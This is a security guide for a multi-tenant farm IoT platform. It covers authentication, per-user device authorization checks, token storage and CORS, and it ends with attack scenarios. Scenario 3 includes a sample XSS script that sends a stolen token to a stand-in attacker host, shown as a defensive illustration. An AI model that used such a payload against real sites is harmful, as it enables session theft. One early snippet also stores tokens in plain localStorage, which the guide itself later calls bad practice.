# AgroPulse Security Guide

## Overview

This document outlines the security architecture for AgroPulse, focusing on preventing unauthorized cross-farm device access in a multi-tenant IoT environment.

## Critical Security Principle

> **⚠️ IMPORTANT**: The frontend alone CANNOT enforce security. All security must be implemented on the backend with proper authentication and authorization.

## Security Architecture

### 1. Authentication

**Purpose**: Verify the identity of users accessing the system.

**Recommended Implementations**:

#### Option A: JWT (JSON Web Tokens)

```java
// Backend: Generate JWT on login
@PostMapping("/api/auth/login")
public LoginResponse login(@RequestBody LoginRequest request) {
    User user = authService.authenticate(request.username, request.password);
    String token = jwtService.generateToken(user);
    return new LoginResponse(token, user);
}

// Frontend: Store token securely
// Use httpOnly cookies (preferred) or secure localStorage
localStorage.setItem('auth_token', token);
```

#### Option B: Session-Based Authentication

```java
// Backend: Use Spring Security sessions
@PostMapping("/api/auth/login")
public User login(@RequestBody LoginRequest request, HttpSession session) {
    User user = authService.authenticate(request.username, request.password);
    session.setAttribute("user", user);
    return user;
}
```

---

### 2. Authorization

**Purpose**: Ensure users can only access devices they own.

#### Database Schema

```sql
-- Users table
CREATE TABLE users (
    id BIGSERIAL PRIMARY KEY,
    username VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    farm_id BIGINT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Devices table with ownership
CREATE TABLE devices (
    device_id VARCHAR(255) PRIMARY KEY,
    name VARCHAR(255),
    location VARCHAR(255),
    farm_id BIGINT NOT NULL,  -- Links device to farm/user
    user_id BIGINT NOT NULL,   -- Owner of the device
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Sensor readings with device reference
CREATE TABLE sensor_readings (
    id BIGSERIAL PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    soil DOUBLE PRECISION,
    humidity DOUBLE PRECISION,
    temperature DOUBLE PRECISION,
    urgent BOOLEAN DEFAULT FALSE,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
);
```

#### Backend Authorization Checks

**Filter Devices by User**:

```java
@GetMapping("/api/devices")
public List<Device> getDevices(@AuthenticationPrincipal User user) {
    // CRITICAL: Only return devices owned by authenticated user
    return deviceService.getDevicesByUserId(user.getId());
}
```

**Validate Device Ownership on All Endpoints**:

```java
@GetMapping("/api/sensor/{deviceId}/latest")
public SensorReading getLatest(
    @PathVariable String deviceId,
    @AuthenticationPrincipal User user
) {
    // CRITICAL: Verify user owns this device before returning data
    if (!deviceService.userOwnsDevice(user.getId(), deviceId)) {
        throw new ResponseStatusException(
            HttpStatus.FORBIDDEN,
            "You do not have access to this device"
        );
    }
    return sensorService.getLatestReading(deviceId);
}

@GetMapping("/api/sensor/{deviceId}/all")
public List<SensorReading> getHistory(
    @PathVariable String deviceId,
    @AuthenticationPrincipal User user
) {
    if (!deviceService.userOwnsDevice(user.getId(), deviceId)) {
        throw new ResponseStatusException(HttpStatus.FORBIDDEN);
    }
    return sensorService.getReadingHistory(deviceId);
}

@PostMapping("/api/sensor/trigger/{deviceId}")
public TriggerResponse trigger(
    @PathVariable String deviceId,
    @AuthenticationPrincipal User user
) {
    if (!deviceService.userOwnsDevice(user.getId(), deviceId)) {
        throw new ResponseStatusException(HttpStatus.FORBIDDEN);
    }
    return sensorService.triggerDevice(deviceId);
}
```

---

### 3. Frontend Security Measures

While the frontend cannot enforce security, it should implement best practices:

#### Secure Token Storage

```typescript
// ❌ BAD: Plain localStorage (vulnerable to XSS)
localStorage.setItem("token", token);

// ✅ GOOD: httpOnly cookies (set by backend)
// Backend sets: Set-Cookie: auth_token=...; HttpOnly; Secure; SameSite=Strict

// ✅ ACCEPTABLE: Secure localStorage with XSS protection
// Only if httpOnly cookies are not feasible
```

#### Include Auth Headers

Update `http-client.ts`:

```typescript
export async function httpClient<T>({
  path,
  ...init
}: HttpClientOptions): Promise<T> {
  const token = localStorage.getItem("auth_token"); // or read from cookie

  const response = await fetch(API_BASE_URL + path, {
    headers: {
      "Content-Type": "application/json",
      ...(token && { Authorization: `Bearer ${token}` }),
      ...init.headers,
    },
    credentials: "include", // Include cookies in requests
    ...init,
  });

  // Handle authentication errors
  if (response.status === 401) {
    // Redirect to login or refresh token
    window.location.href = "/login";
    throw new Error("Unauthorized");
  }

  if (response.status === 403) {
    throw new Error("You do not have access to this resource");
  }

  // ... rest of implementation
}
```

#### Handle Unauthorized Access

```typescript
// In dashboard hook
const loadDevices = useCallback(async () => {
  try {
    const deviceList = await viewModel.loadDevices();
    setDevices(deviceList);
  } catch (error) {
    if (error.message.includes("Unauthorized")) {
      // Redirect to login
      router.push("/login");
    } else if (error.message.includes("access")) {
      // Show access denied message
      setState((prev) => ({ ...prev, error: "Access denied" }));
    }
  }
}, [viewModel]);
```

---

### 4. CORS Configuration

**Backend CORS Setup**:

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("http://localhost:3000") // Your frontend URL
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true); // Allow cookies
    }
}
```

---

## Security Checklist

### Backend (CRITICAL)

- [ ] Implement user authentication (JWT or sessions)
- [ ] Create user and device ownership database schema
- [ ] Add authorization middleware to ALL device endpoints
- [ ] Filter `/api/devices` to return only user's devices
- [ ] Validate device ownership on `/api/sensor/{deviceId}/*` endpoints
- [ ] Configure CORS to only allow your frontend domain
- [ ] Use HTTPS in production
- [ ] Implement rate limiting to prevent abuse

### Frontend (Best Practices)

- [ ] Store auth tokens securely (httpOnly cookies preferred)
- [ ] Include auth headers in all API requests
- [ ] Handle 401/403 responses gracefully
- [ ] Redirect to login on authentication failure
- [ ] Never trust client-side filtering alone
- [ ] Implement proper error handling for access denied scenarios

---

## Attack Scenarios & Mitigations

### Scenario 1: User Tries to Access Another Farm's Device

**Attack**:

```bash
# Attacker changes deviceId in request
GET /api/sensor/FARM_B_DEVICE_001/latest
Authorization: Bearer <attacker_token>
```

**Mitigation**:

```java
// Backend validates ownership
if (!deviceService.userOwnsDevice(user.getId(), "FARM_B_DEVICE_001")) {
    throw new ResponseStatusException(HttpStatus.FORBIDDEN);
}
```

### Scenario 2: User Manipulates Frontend to Show All Devices

**Attack**:

```javascript
// Attacker modifies frontend code to call /api/devices with different params
```

**Mitigation**:

- Backend MUST filter devices by authenticated user
- Frontend manipulation cannot bypass server-side checks

### Scenario 3: Token Theft via XSS

**Attack**:

```javascript
// Malicious script steals token from localStorage
<script>
  fetch('https://attacker.com?token=' + localStorage.getItem('token'))
</script>
```

**Mitigation**:

- Use httpOnly cookies (cannot be accessed by JavaScript)
- Implement Content Security Policy (CSP)
- Sanitize all user inputs

---

## Production Deployment Checklist

- [ ] Enable HTTPS/TLS for all connections
- [ ] Use environment variables for secrets (never commit to git)
- [ ] Implement proper logging and monitoring
- [ ] Set up intrusion detection
- [ ] Regular security audits and penetration testing
- [ ] Keep dependencies updated
- [ ] Implement backup and disaster recovery

---

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Spring Security Documentation](https://spring.io/projects/spring-security)
- [Next.js Authentication](https://nextjs.org/docs/authentication)
